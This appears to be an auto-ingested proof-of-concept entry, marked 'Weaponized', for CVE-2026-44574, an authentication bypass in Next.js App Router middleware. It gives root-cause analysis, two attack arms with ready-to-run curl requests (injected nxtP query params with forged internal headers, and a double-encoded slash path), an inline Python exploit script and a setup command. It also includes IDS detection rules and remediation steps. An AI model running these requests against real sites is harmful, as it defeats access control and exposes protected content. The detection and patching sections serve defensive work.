# Next.js Dynamic Route Injection Auth Bypass (CVE-2026-44574)

<!-- 
  File: 2026-05-17_nextjs-dynamic-route-injection-auth-bypass.md
  Location: pocs/web/
-->

---

## Metadata

| Field | Value |
|---|---|
| **Date Added** | 2026-05-17 |
| **Last Updated** | 2026-05-08 |
| **Author / Researcher** | dwisiswant0 |
| **CVE / Advisory** | CVE-2026-44574 |
| **Category** | web |
| **Severity** | High |
| **CVSS Score** | 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) |
| **Status** | Weaponized |
| **Tags** | auth-bypass, dynamic-route, nxtP-injection, middleware-bypass, param-smuggling, Next.js, App-Router, unauthenticated |
| **Related** | N/A |

---

## Affected Target

| Field | Value |
|---|---|
| **Software / System** | Next.js App Router with dynamic route segments and middleware-based access control |
| **Versions Affected** | Next.js 15.4.0 - 15.5.15 and 16.0.0 - 16.2.4 |
| **Language / Platform** | JavaScript / Node.js |
| **Authentication Required** | No |
| **Network Access Required** | Yes |

---

## Summary

CVE-2026-44574 is an authentication bypass in Next.js App Router applications that use middleware to protect dynamic route pages. Specially crafted query parameters (`nxtP*` / `nxtI*` internal Next.js route params) injected on a public URL cause the App Router rendering layer to invoke and render a protected dynamic route page while middleware only sees the benign public pathname and applies no access control. A second bypass arm exploits a double-encoding mismatch in `client/route-params.ts` via `%252F` (double-encoded slash) in the pathname. In both cases the visible request path differs from what the rendering layer processes, allowing middleware-protected content to be reached without authorization. Rated CVSS 8.1 High with no known active exploitation.

---

## Vulnerability Details

### Root Cause

Two related issues: (1) Next.js never stripped `nxtP*` / `nxtI*` internal route-param search params from inbound user requests. The App Router trusted these params when building the `params` object for page rendering, while middleware evaluated `request.nextUrl.pathname` (the actual request path). This created a split-view: middleware saw `/safe`, the page handler rendered `/admin/[slug]`. (2) `URL.pathname.split('/')` on the client and `decodeURIComponent` + `encodeURIComponent` on the server produced different canonical forms for paths containing characters like `,`, `:`, or `%2F`, so `%252F` (double-encoded slash) in a dynamic segment round-tripped differently through middleware and the page handler. The patch (`f1c11203d5`) normalised encoded pathname parts on the client to match server round-trip behavior, closing the encoding mismatch variant.

### Attack Vector

Two arms: (A) Attacker sends `GET /safe?nxtPslug=secret-page` with internal headers `x-matched-path: /admin/[slug]` and `x-now-route-matches: 1=secret-page`. Middleware sees pathname `/safe` and passes; App Router renders the protected page with injected params. (B) Attacker sends `GET /admin/foo%252F<slug>` - middleware sees one slug value, page handler decodes to another, allowing different `if (slug === "...")` branches to be reached.

### Impact

Authentication bypass - middleware-implemented access control is defeated for any page using dynamic route segments. An unauthenticated attacker can render protected pages and retrieve their content. Potential cache poisoning where different `nxtP*` values produce the same canonical URL in CDN caches but different rendered content.

---

## Environment / Lab Setup

```
OS:          Linux / macOS / Windows
Target:      Next.js 15.4.0 - 15.5.15 or 16.0.0 - 16.2.4 with App Router dynamic routes and middleware auth
Attacker:    Any host able to send crafted HTTP GET requests
Tools:       python3, bash, curl
```

### Setup Steps

```bash
# Clone source PoC collection
git clone https://github.com/dwisiswant0/next-16.2.4-pocs.git
cd next-16.2.4-pocs/poc/CVE-2026-44574_GHSA-492v-c6pp-mqqv

# Run exploit against local target
TARGET=http://localhost:3000 \
PROTECTED_BASE=/admin \
PROTECTED_SLUG=secret-page \
PUBLIC_PATH=/safe \
python3 exploit.py
```

---

## Proof of Concept

### Step-by-Step Reproduction

1. **Confirm baseline is blocked** - canonical protected path is gated by middleware.
   ```bash
   curl -i http://target/admin/secret-page
   # Expect: HTTP/1.1 307  Location: /login
   ```

2. **Bypass arm A** - inject nxtP params on a public path.
   ```bash
   curl -i \
     -H 'x-matched-path: /admin/[slug]' \
     -H 'x-now-route-matches: 1=secret-page' \
     "http://target/safe?nxtPslug=secret-page&__nextDefaultLocale=&__nextLocale="
   # Vulnerable: HTTP/1.1 200 with protected page content
   # Patched:    HTTP/1.1 307  Location: /login
   ```

3. **Bypass arm B** - double-encoded slash mismatch.
   ```bash
   curl -i --path-as-is "http://target/admin/foo%252Fsecret-page"
   # Vulnerable: HTTP/1.1 200 with protected content
   # Patched:    HTTP/1.1 307 or 404
   ```

### Exploit Code

> See `exploit.py` and `exploit.sh` in this folder.

```python
# Minimal inline PoC — full version in exploit.py
import urllib.request, urllib.parse, urllib.error

TARGET = "http://target"
SLUG = "secret-page"

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **kw): return None

qs = urllib.parse.urlencode({"nxtPslug": SLUG, "__nextDefaultLocale": "", "__nextLocale": ""})
req = urllib.request.Request(
    f"{TARGET}/safe?{qs}",
    headers={
        "x-matched-path": "/admin/[slug]",
        "x-now-route-matches": f"1={SLUG}",
    }, method="GET"
)
with urllib.request.build_opener(NoRedirect()).open(req, timeout=15) as r:
    print(r.status, r.read(500))
```

### Expected Output

```
x VULNERABLE — arm A: public path returned the protected page (sentinel 'ADMIN_SECRET_FLAG' present).

>>> RESULT: PASS (vulnerability reproduced) <<<
```

---

## Screenshots / Evidence

- `screenshots/` - add captures showing protected dynamic route content returned via the public path bypass

---

## Detection & Indicators of Compromise

```
# HTTP access log pattern: GET to public path with nxtP* params and x-matched-path header
GET /safe?nxtPslug=secret-page  x-matched-path: /admin/[slug]  x-now-route-matches: 1=secret-page
# Or: requests with %252F (double-encoded slash) in path segments
GET /admin/foo%252Fsecret-page
```

**SIEM / IDS Rule (example):**
```
alert http any any -> $HTTP_SERVERS any (
  msg:"Possible CVE-2026-44574 dynamic-route param injection bypass";
  pcre:"/[?&]nxtP[A-Za-z]/Q";
  sid:900044574a; rev:1;
)
alert http any any -> $HTTP_SERVERS any (
  msg:"Possible CVE-2026-44574 double-encoded slash bypass";
  content:"%252F"; http_uri;
  sid:900044574b; rev:1;
)
```

---

## Remediation

| Action | Detail |
|---|---|
| **Patch** | Upgrade Next.js to 15.5.16 or 16.2.5+ |
| **Workaround** | In every protected layout or page, re-derive sensitive params from `params` (the resolved value), not from `request.url`; never trust inbound `nxtP*` query params as route context |
| **Config Hardening** | At CDN/WAF, drop or reject any inbound request whose query keys start with `nxtP`, `nxtI`, or `__NEXT_`; block requests containing `%252F` in path segments |

---

## References

- [CVE-2026-44574 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-44574)
- [Next.js Advisory - GHSA-492v-c6pp-mqqv](https://github.com/vercel/next.js/security/advisories/GHSA-492v-c6pp-mqqv)
- [Next.js Patch Commit f1c11203d5](https://github.com/vercel/next.js/commit/f1c11203d5)
- [Source Repository - dwisiswant0/next-16.2.4-pocs](https://github.com/dwisiswant0/next-16.2.4-pocs)

---

## Notes

Auto-ingested from https://github.com/dwisiswant0/next-16.2.4-pocs on 2026-05-17.

No known active exploitation at time of disclosure. The `nxtP*` / `nxtI*` injection arm is particularly dangerous in Vercel-hosted deployments where the internal proxy legitimately uses these headers, as WAF rules blocking them may cause false positives. Defense-in-depth recommendation: always authenticate inside the page/layout handler rather than relying solely on middleware pathname matching. Issue tracked as #53.
